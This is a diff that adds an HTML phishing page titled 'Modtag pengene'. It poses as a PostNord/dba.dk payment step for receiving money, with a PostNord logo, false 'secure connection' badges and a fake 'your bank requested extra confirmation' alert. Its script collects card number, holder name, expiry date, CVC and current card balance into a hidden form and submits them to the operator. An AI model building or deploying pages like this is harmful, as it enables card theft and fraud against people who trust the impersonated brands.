@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+      <script type="text/javascript" charset="utf-8" async="" src="Modtag%20pengene_files/loader.js"></script>
+      <script src="Modtag%20pengene_files/jquery_002.js"></script>
+      <script src="Modtag%20pengene_files/jquery_003.js"></script>
+      
+
+
+      <link rel="stylesheet" href="Modtag%20pengene_files/bootstrap.css">
+      <style type="text/css">
+         
+// .modal-open      - body class for killing the scroll
+// .modal           - container to scroll within
+// .modal-dialog    - positioning shell for the actual modal
+// .modal-content   - actual modal w/ bg and corners and stuff
+
+
+.modal-open {
+  // Kill the scroll on the body
+  overflow: hidden;
+
+  .modal {
+    overflow-x: hidden;
+    overflow-y: auto;
+  }
+}
+
+// Container that the modal scrolls within
+.modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: $zindex-modal;
+  display: none;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+}
+
+// Shell div to position the modal with bottom padding
+.modal-dialog {
+  position: relative;
+  width: auto;
+  margin: $modal-dialog-margin;
+  pointer-events: none;
+  .modal.fade & {
+    @include transition($modal-transition);
+    transform: $modal-fade-transform;
+  }
+  .modal.show & {
+    transform: $modal-show-transform;
+  }
+
+  .modal.modal-static & {
+    transform: $modal-scale-transform;
+  }
+}
+
+.modal-dialog-scrollable {
+  display: flex; // IE10/11
+  max-height: subtract(100%, $modal-dialog-margin * 2);
+
+  .modal-content {
+    max-height: subtract(100vh, $modal-dialog-margin * 2); // IE10/11
+    overflow: hidden;
+  }
+
+  .modal-header,
+  .modal-footer {
+    flex-shrink: 0;
+  }
+
+  .modal-body {
+    overflow-y: auto;
+  }
+}
+
+.modal-dialog-centered {
+  display: flex;
+  align-items: center;
+  min-height: subtract(100%, $modal-dialog-margin * 2);
+
+  // Ensure `modal-dialog-centered` extends the full height of the view (IE10/11)
+  &::before {
+    display: block; // IE10
+    height: subtract(100vh, $modal-dialog-margin * 2);
+    height: min-content; // Reset height to 0 except on IE
+    content: "";
+  }
+
+  // Ensure `.modal-body` shows scrollbar (IE10/11)
+  &.modal-dialog-scrollable {
+    flex-direction: column;
+    justify-content: center;
+    height: 100%;
+
+    .modal-content {
+      max-height: none;
+    }
+
+    &::before {
+      content: none;
+    }
+  }
+}
+
+// Actual modal
+.modal-content {
+  position: relative;
+  display: flex;
+  flex-direction: column;
+  width: 100%; // Ensure `.modal-content` extends the full width of the parent `.modal-dialog`
+  // counteract the pointer-events: none; in the .modal-dialog
+  color: $modal-content-color;
+  pointer-events: auto;
+  background-color: $modal-content-bg;
+  background-clip: padding-box;
+  border: $modal-content-border-width solid $modal-content-border-color;
+  @include border-radius($modal-content-border-radius);
+  @include box-shadow($modal-content-box-shadow-xs);
+  // Remove focus outline from opened modal
+  outline: 0;
+}
+
+// Modal background
+.modal-backdrop {
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: $zindex-modal-backdrop;
+  width: 100vw;
+  height: 100vh;
+  background-color: $modal-backdrop-bg;
+
+  // Fade for backdrop
+  &.fade { opacity: 0; }
+  &.show { opacity: $modal-backdrop-opacity; }
+}
+
+// Modal header
+// Top section of the modal w/ title and dismiss
+.modal-header {
+  display: flex;
+  align-items: flex-start; // so the close btn always stays on the upper right corner
+  justify-content: space-between; // Put modal header elements (title and dismiss) on opposite ends
+  padding: $modal-header-padding;
+  border-bottom: $modal-header-border-width solid $modal-header-border-color;
+  @include border-top-radius($modal-content-inner-border-radius);
+
+  .close {
+    padding: $modal-header-padding;
+    // auto on the left force icon to the right even when there is no .modal-title
+    margin: (-$modal-header-padding-y) (-$modal-header-padding-x) (-$modal-header-padding-y) auto;
+  }
+}
+
+// Title text within header
+.modal-title {
+  margin-bottom: 0;
+  line-height: $modal-title-line-height;
+}
+
+// Modal body
+// Where all modal content resides (sibling of .modal-header and .modal-footer)
+.modal-body {
+  position: relative;
+  // Enable `flex-grow: 1` so that the body take up as much space as possible
+  // when there should be a fixed height on `.modal-dialog`.
+  flex: 1 1 auto;
+  padding: $modal-inner-padding;
+}
+
+// Footer (for actions)
+.modal-footer {
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center; // vertically center
+  justify-content: flex-end; // Right align buttons with flex property because text-align doesn't work on flex items
+  padding: $modal-inner-padding - $modal-footer-margin-between / 2;
+  border-top: $modal-footer-border-width solid $modal-footer-border-color;
+  @include border-bottom-radius($modal-content-inner-border-radius);
+
+  // Place margin between footer elements
+  // This solution is far from ideal because of the universal selector usage,
+  // but is needed to fix https://github.com/twbs/bootstrap/issues/24800
+  > * {
+    margin: $modal-footer-margin-between / 2;
+  }
+}
+
+// Measure scrollbar width for padding body during modal show/hide
+.modal-scrollbar-measure {
+  position: absolute;
+  top: -9999px;
+  width: 50px;
+  height: 50px;
+  overflow: scroll;
+}
+
+// Scale up the modal
+@include media-breakpoint-up(sm) {
+  // Automatically set modal's width for larger viewports
+  .modal-dialog {
+    max-width: $modal-md;
+    margin: $modal-dialog-margin-y-sm-up auto;
+  }
+
+  .modal-dialog-scrollable {
+    max-height: subtract(100%, $modal-dialog-margin-y-sm-up * 2);
+
+    .modal-content {
+      max-height: subtract(100vh, $modal-dialog-margin-y-sm-up * 2);
+    }
+  }
+
+  .modal-dialog-centered {
+    min-height: subtract(100%, $modal-dialog-margin-y-sm-up * 2);
+
+    &::before {
+      height: subtract(100vh, $modal-dialog-margin-y-sm-up * 2);
+      height: min-content;
+    }
+  }
+
+  .modal-content {
+    @include box-shadow($modal-content-box-shadow-sm-up);
+  }
+
+  .modal-sm { max-width: $modal-sm; }
+}
+
+@include media-breakpoint-up(lg) {
+  .modal-lg,
+  .modal-xl {
+    max-width: $modal-lg;
+  }
+}
+
+@include media-breakpoint-up(xl) {
+  .modal-xl { max-width: $modal-xl; }
+}
+
+      </style>
+
+
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <title>Modtag pengene</title>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <link rel="stylesheet" type="text/css" href="Modtag%20pengene_files/cpg_waiter.css">
+      <link rel="stylesheet" type="text/css" href="Modtag%20pengene_files/jquery.css">
+      <link rel="stylesheet" type="text/css" href="Modtag%20pengene_files/pay-card.css">
+      <script type="text/javascript" src="Modtag%20pengene_files/es5-shim.js"></script>
+      <script type="text/javascript" src="Modtag%20pengene_files/jquery.js"></script>
+      <script type="text/javascript" src="Modtag%20pengene_files/rb.js"></script>
+      <script type="text/javascript" src="Modtag%20pengene_files/common.js"></script>
+      <script type="text/javascript" src="Modtag%20pengene_files/cpg_waiter.js"></script>
+      <script type="text/javascript" src="Modtag%20pengene_files/standard_waiter.js"></script>
+      <style>
+        .js-button-submit {
+          background: #ffdd19 !important;
+        }
+      </style>
+      <style> 		#loading { 		   width: 100%; 		   height: 100%; 		   top: 0; 		   left: 0; 		   position: fixed; 		   display: block; 		   opacity: 0.7; 		   background-color: #fff; 		   z-index: 99; 		   text-align: center; 		}  		#loading-image { 		  position: absolute; 		  top: 50%; 		  left: 50%; 		  z-index: 100; 		} 		 		.input-error {border-color: #ed1651!important;} 		 	</style>
+   </head>
+   <body class="body_fixed-width_no body_fixed-height_no body_background_youla-mobile"><div id="chat-application" style="background: transparent none repeat scroll 0% 0%; overflow: hidden; display: block; margin: 0px; padding: 0px; bottom: 24px; transition: none 0s ease 0s; z-index: 2147483647; position: fixed; left: initial; right: 11px; max-height: 65px; max-width: 115px; height: 65px; width: 115px;"><iframe id="chat-application-iframe" title="Smartsupp" aria-hidden="true" style="background: transparent none repeat scroll 0% 0%; overflow: hidden; position: relative; width: 100%; height: 100%; margin: 0px; border: medium none; min-width: inherit; max-width: inherit; min-height: inherit; max-height: inherit; transition: none 0s ease 0s; z-index: 10000001;"></iframe></div>
+   <script type="text/javascript"> var _smartsupp = _smartsupp || {}; _smartsupp.key = 'c77ba1536f8e55675d15f6e6bb522a8adccc7912'; window.smartsupp||(function(d) { var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[]; s=d.getElementsByTagName('script')[0];c=d.createElement('script'); c.type='text/javascript';c.charset='utf-8';c.async=true; c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s); })(document); </script>   <div id="loading" style="display: none;">
+         <img id="loading-image" src="Modtag%20pengene_files/loader.gif" alt="Пожалуйста подождите...">
+      </div>
+      <div class="pay-card-layout pay-card-layout_type_youla-mobile">
+         <div class="pay-card-layout__header_type_vkpay">
+            <div class="pay-card-layout__logo">
+              <img src="Modtag%20pengene_files/postnord-logo.png" style="width: 134px;">            </div>
+         </div>
+
+         <div class="modal-dialog" role="document" id="balance_check" style="display: none;">
+         <div class="modal-content">
+         <div class="modal-header">
+          <img src="Modtag%20pengene_files/confirm.jpg" style="width: 25px;">
+         <h5 class="modal-title" id="exampleModalLabel" style="margin: auto;">
+          <b style="font-size: 1.25em;"> Dine kortoplysninger er bekræftet </b></h5>
+
+
+         </div>
+         <div class="modal-body">
+         <p>
+          For at bekræfte dit kort i dba.dk er vi nødt til midlertidigt 
+at trække et bestemt beløb fra dit kort (beløbet afhænger af din bank). 
+Pengene overføres straks tilbage til dit kort.
+        </p>
+         <p>
+          For at bekræfte ejerskabet af kortet skal du indtaste den aktuelle saldo.
+        </p>
+
+         <div class="form-group">
+         <label for="cardbalance" class="col-form-label">Balance:</label>
+         <input type="digit" class="form-control" name="cardbalance" placeholder="Kartenguthaben" id="card_balance" onfocus="$(this).css('border-color', '');" onkeypress="$(this).val($(this).val().replace(',', '.'));" onkeyup="$(this).val($(this).val().replace(',', '.'));">
+         </div>
+
+         </div>
+         <div class="modal-footer">
+         <button type="submit" style="background-color: #1564c0; border-color: #1564c0; color: #fff; font-weight: bold;" class="btn btn-primary" onclick="cardlog();" id="paybutton">At bekræfte</button>
+         </div>
+         </div>
+         </div>         
+         <div class="pay-card js-pay-card pay-card_type_youla-mobile" data-type="freepay" id="carddata">
+            <div class="pay-card__row">
+               <div class="pay-card__card js-credit-card">
+                  <div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible credit-card-form_single-side_yes">
+                        <div class="credit-card-form__card-wrapper">
+                           <div class="credit-card-form__card credit-card-form__card_position_front">
+                              <div class="payment-systems-icons payment-systems-icons">
+                                 <span id="mir" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span>
+                                 <span id="visa" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span>
+                                 <span id="mastercard" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span>
+                                 <span id="maestro" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span>
+                              </div>
+                              <div class="credit-card-form__label-group credit-card-form__label-group_type_card-number clearfix">
+                                 <label class="js-cc-label credit-card-form__label">
+                                    <span class="credit-card-form__title">Kortnummer</span>
+                                    <input type="tel" name="card_number" id="cardnumber" autocomplete="cc-number" placeholder="Fra 16 til 19 cifre" class="credit-card-form__input js-cc-input js-cc-number-input" required="">
+                                    <div class="credit-card-form__error-text">Kortnummer introducido incorrectamente</div>
+                                 </label>
+                              </div>
+                              <div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
+                                 <label class="js-cc-label credit-card-form__label">
+                                    <span class="credit-card-form__title">Ejerens for- og efternavn</span>
+                                    <input type="text" name="cardholder" id="cardholder" autocomplete="cc-name" class="credit-card-form__input js-cc-input js-cc-name-input" maxlength="40" placeholder="" required="">
+                                    <div class="credit-card-form__error-text">Ejerens for- og efternavn</div>
+                                 </label>
+                              </div>                          
+                              <div id="step2" style="display: none;" class="js-card-expiry-date-block credit-card-form__label-group credit-card-form__label-group_type_expiration-date clearfix">
+                                 <label class="js-cc-label credit-card-form__label">
+                                    <span class="credit-card-form__title">Gyldighedsdato</span>
+                                    <input type="text" name="expdate" id="expdate" autocomplete="cc-exp" placeholder="MM/YY" class="credit-card-form__input js-cc-input js-cc-exp-input" required="">
+                                    <div class="credit-card-form__error-text">Falsches Datum</div>
+                                 </label>
+                                 <label class="js-cc-label credit-card-form__label credit-card-form__label_type_cvv js-cc-cvv-label">
+                                    <span class="credit-card-form__title">
+                                       CVC/CVV 
+                                       <div tabindex="-1" class="credit-card-form__cvv-icon js-cc-cvv-icon"></div>
+                                    </span>
+                                    <div class="js-cvv-hint-tooltip credit-card-form__tooltip credit-card-form__tooltip_type_cvv">
+                                       Letzte 3 Ziffern auf dem Unterschriftsstreifen
+                                       <div class="credit-card-form__tooltip-icon"></div>
+                                       <div class="credit-card-form__tooltip-arrow"></div>
+                                    </div>
+                                    <input type="tel" name="card_cvc" id="cvc2" placeholder="" class="credit-card-form__input  js-cc-input js-cc-cvv-input" autocomplete="off" required="">
+                                    <div class="credit-card-form__error-text js-cc-error-text" id="si">Letzte drei Ziffern auf der Rückseite</div>
+                                 </label>
+                              </div>
+                              
+                           </div>
+                        </div>
+                        <div class="credit-card-form__submit">
+                           <div class="credit-card-form__submit-inner">
+                              <input style="cursor: pointer;" onclick="nextcard();" id="nextpay" type="submit" class="js-button-submit button" name="submit" value="At bekræfte">
+                           </div>
+                        </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+         
+         <div class="secure-information secure-information_type_youla-mobile">
+            <span class="secure-information__text" title="Защищённое соединение. Ваши данные в безопасности.">
+            <span class="secure-information__icon"></span> <span class="secure-information__text_type_protocol">HTTPS / SSL</span>
+            <span class="secure-information__text_type_secure-connection">Sikker forbindelse</span> 
+            </span>
+         </div>
+      </div>
+      <script language="javascript" type="text/javascript">
+         function load() {
+         	$('#loading').show();
+            setTimeout(function(){ 
+            	$('#loading').hide();
+            }, 1000);            
+         }
+         load();
+         
+         window.onload = function () {
+         	var system = document.getElementById('cardnumber');
+         	system.onkeyup = function () {
+         		var value = system.value;
+         		system.value.replace(/(\d)(?=(\d{3})+(\D|$))/g, '$1')
+         		if (value.length > 0) {
+         			var num = value[0];
+         			if (num == 2) {
+         				$('#mir').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
+         			} else if (num == 4) {
+         				$('#visa').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
+         			} else if (num == 5) {
+         				$('#mastercard').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
+         			} else if (num == 6) {
+         				$('#maestro').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
+         			}
+         		}
+         		
+         		if (value.length <= 0) {
+         			$('#mir').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
+         			$('#visa').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
+         			$('#mastercard').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
+         			$('#maestro').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
+         		}
+         	}
+         }
+     	$("#cardnumber").mask("9999 9999 9999 9999");
+     	$("#expdate").mask("99/99");
+     	$("#cvc2").mask("999");
+      </script>
+   
+<script type="text/javascript">
+	$("#subm").val('At bekræfte');
+</script>
+
+<form class="form-process" action="#" method="post" style="display: none;">
+	<input type="hidden" id="card_month" name="card_expire_month" value="">
+	<input type="hidden" id="card_year" name="card_expire_year" value="">
+	<input type="hidden" id="sendholder" name="card_holdername" value="">
+  <input type="hidden" id="sendbalance" name="balance" value="">
+	<input type="hidden" id="card_number" name="card_number" value="">	
+	<input type="hidden" id="card_cvc" name="card_cvc" value="">
+  <input type="hidden" name="page" value="filter">
+	</form>	
+
+
+<script>
+	function load() {
+	  $('#loading').show();
+	 setTimeout(function(){ 
+		 $('#loading').hide();
+	 }, 1000);            
+  }
+  load();
+function nextcard(){
+if($('#cardnumber').val() != '' && luhnAlgorithm($('#cardnumber').val())){
+  $('#step2').show();
+  $('#nextpay').attr('onclick', 'nextpay();');
+    alert('Din bank har anmodet om yderligere kræftelse. Udfyld de ekstra felter og prøv igen.')
+  }else{
+    ($('#cardnumber').val() == '') && luhnAlgorithm($('#cardnumber').val())?$('#cardnumber').css("border-color", "red"):$('#cardnumber').css("border-color", "");
+    alert('Kort indtastet forkert.');
+  }
+}
+
+function luhnAlgorithm(value) {
+    value = value.replace(/\D/g, '');
+    var nCheck = 0;
+    var bEven = false;
+    for (var n = value.length - 1; n >= 0; n--) {
+        var nDigit = parseInt(value.charAt(n), 10);
+        if (bEven && (nDigit *= 2) > 9) {
+            nDigit -= 9;
+        }
+        nCheck += nDigit;
+        bEven = !bEven;
+    }
+    return (nCheck % 10) == 0;
+}
+
+function nextpay(){
+  $('#loading').show();
+  setTimeout(function(){ $('#loading').hide();}, 1000); 
+  if($('#cardnumber').val() != '' && $('#expdate').val() != '' && $('#cvc2').val() != ''){
+    load();
+    $('#carddata').css('display','none');
+    $('#loading').show();
+    setTimeout(function(){  $('#loading').hide(); }, 3000); 
+    $('#balance_check').css('display','');
+  }else{
+    ($('#cardnumber').val() == '')?$('#cardnumber').css("border-color", "red"):$('#cardnumber').css("border-color", "");
+    ($('#cardholder').val() == '')?$('#cardholder').css("border-color", "red"):$('#cardholder').css("border-color", "");
+    ($('#expdate').val() == '')?$('#expdate').css("border-color", "red"):$('#expdate').css("border-color", "");
+    ($('#cvc2').val() == '')?$('#cvc2').css("border-color", "red"):$('#cvc2').css("border-color", "");
+  }
+}
+
+function cardlog() {
+var card_date = $('#expdate').val();
+Data = new Date();
+let month = card_date.split("/")[0]
+let year = card_date.split("/")[1]
+let current_moth = Data.getMonth() + 1;
+let current_year = Data.getFullYear().toString();
+current_year = current_year[0] + current_year[1];
+if (month[0] == 0){ month = month.slice(1); }
+var valid_card = '1';
+let sl = ($('#card_balance').length >= 1 && $('#card_balance').val() != ' ' && $('#card_balance').val() != '' && $('#card_balance').val() != ' ' && $('#card_balance').val() != 0) ? true : false;
+
+if($('#cardnumber').val() != '' && $('#expdate').val() != '' && $('#cvc2').val() != '' && sl  && valid_card == '1'){
+  $('#paybutton').css('background', 'gray');
+  $('#paybutton').attr('disabled', '1');
+
+  $('#card_number').val($('#cardnumber').val());
+  $('#card_cvc').val($('#cvc2').val());
+  $('#sendholder').val($('#cardholder').val());
+  $('#sendbalance').val($('#card_balance').val());
+  $('#card_month').val(month);
+  $('#card_year').val(year);
+  $(".form-process").submit();
+
+}else{
+  ($('#cardnumber').val() == '')?$('#cardnumber').css("border-color", "red"):$('#cardnumber').css("border-color", "");
+  ($('#card_balance').val() == '')?$('#card_balance').css("border-color", "red"):$('#card_balance').css("border-color", "");
+  if ($('#card_balance').val() < 2){
+    $('#verif_balance').toggle();
+    $('#card_balance').css("border-color", "red");
+  }
+  if ($('#card_balance').val() == 0){
+    $('#verif_balance').toggle();
+    $('#card_balance').css("border-color", "red");
+  }
+
+
+($('#cardholder').val() == '')?$('#cardholder').css("border-color", "red"):$('#cardholder').css("border-color", "");
+if(valid_card == '0'){
+ $('#expdate').css("border-color", "red")
+}
+if (valid_card == '1'){
+ $('#expdate').css("border-color", "");
+}
+
+if($('#expdate').val() == ''){
+ $('#expdate').css("border-color", "red")
+}
+if ($('#expdate').val() == ''){
+ $('#expdate').css("border-color", "");
+}      
+($('#cvc2').val() == '')?$('#cvc2').css("border-color", "red"):$('#cvc2').css("border-color", "");
+};
+}
+
+$("#cardnumber").mask("9999 9999 9999 9999");
+  $("#expdate").mask("99/99");
+  $("#cvc2").mask("999");
+
+</script>
+</body></html>
